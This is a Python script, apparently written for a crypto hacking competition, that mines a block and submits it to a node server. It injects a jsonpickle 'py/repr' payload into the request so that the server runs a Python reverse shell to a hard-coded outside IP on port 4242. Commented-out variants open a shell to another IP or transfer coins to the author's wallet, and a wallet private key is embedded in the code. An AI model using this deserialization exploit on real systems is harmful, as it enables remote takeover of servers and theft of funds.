import exchange
import blockchain
import miner
import utils
import datetime
import jsonpickle
import requests
import json

REWARD = 100_000_000
NODE_SERVER = "https://hackcrypto.hackwsb.net"
USERNAME = "000alen_7cb3cb"
WALLET_ADDRESS = "db096081f997aa787c37f04022466bf9612ccaa736529b372ea9aa0c31874cf1"
WALLET_PRIVATE = "ee641b692155d4cedaa732be2e2212a674a60ad3ed6eaabd10df9ae2fe2bfe08"
PREVIOUS_HASH = input(">>> ")

CODE = """
import socket, os, pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("91.192.10.53", 4242))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("\\x2f" + "bin" + "\\x2f" + "sh")
""".strip().replace("\n", ";")

EXPLOIT = f"os/exec('{CODE}')"

# __import__("hackbase" + ".client.exchange")
# EXPLOIT = "time/time.sleep(10)"
# EXPLOIT = f"""time/__import__("hackbase" + ".client.exchange").transfer({WALLET_ADDRESS}, {REWARD}, __import__("hackbase" + ".client.exchange").public, __import__("hackbase" + ".client.exchange").private)"""
# EXPLOIT = "hackbase.client.exchange/hackbase.client.exchange.donate()"
# EXPLOIT = 'time/import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("190.21.3.11",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("\\x2fbin\\x2fsh")'
# EXPLOIT = """time/__import__("hackbase" + ".client.exchange").public"""
# EXPLOIT = f"time/import exchange; exchange.transfer({WALLET_ADDRESS}, {REWARD}, exchange.public, exchange.private)"
# EXPLOIT = f"time/__import__('exchange').transfer({WALLET_ADDRESS}, 1000, __import__('exchange').public, __import__('exchange').private)"
# EXPLOIT = "time/__import__('exchange').transfer('db096081f997aa787c37f04022466bf9612ccaa736529b372ea9aa0c31874cf1', 10000, __import__('exchange').public, __import__('exchange').private)"


def try_mine(block: blockchain.Block) -> bool:
    block.nonce += 1
    return block.is_valid()


def mine(block: blockchain.Block):
    print("Mining now with %i transactions." % len(block.transactions))
    hashes_done = 0

    start = datetime.datetime.now()
    while not try_mine(block):
        hashes_done += 1

        if hashes_done % 300000 == 0:
            end = datetime.datetime.now()
            seconds = (end - start).total_seconds()

            print("Hash Rate: %i hashes/second      \r" % (300000 / seconds),)
            
            start = datetime.datetime.now()

    print("Mined block:", block.get_hash(), "with nonce", block.nonce)


def jsonpickle_decode(text):
    return jsonpickle.decode(text.replace("hackbase.client.", ""))


def post_route(route, data=None):
    endpoint = "%s/u/%s/tracker/%s" % (
        NODE_SERVER,
        USERNAME,
        route
    )

    try:
        encoded = jsonpickle.encode(data)
        encoded = json.loads(encoded)
        encoded["1"] = {"py/repr": EXPLOIT}
        encoded = json.dumps(encoded)

        r = requests.post(endpoint, data=encoded)

        return jsonpickle_decode(r.text) #type: ignore
    except Exception as e:
        print(f"failed request: {route}, error: {e}")
        return None


reward = blockchain.Transaction(
    id=utils.gen_uuid(),
    sender="mined",
    receiver=WALLET_ADDRESS,
    value=10,
    signature=""
)
reward.sign(WALLET_PRIVATE)

block = blockchain.Block(
    transactions=[reward],
    previous_hash=PREVIOUS_HASH,
    miner=USERNAME
)

mine(block)

resp = post_route("add", data=block)
print(f"RESP: {resp}")
if resp and resp["success"]:
    print("Block added!")
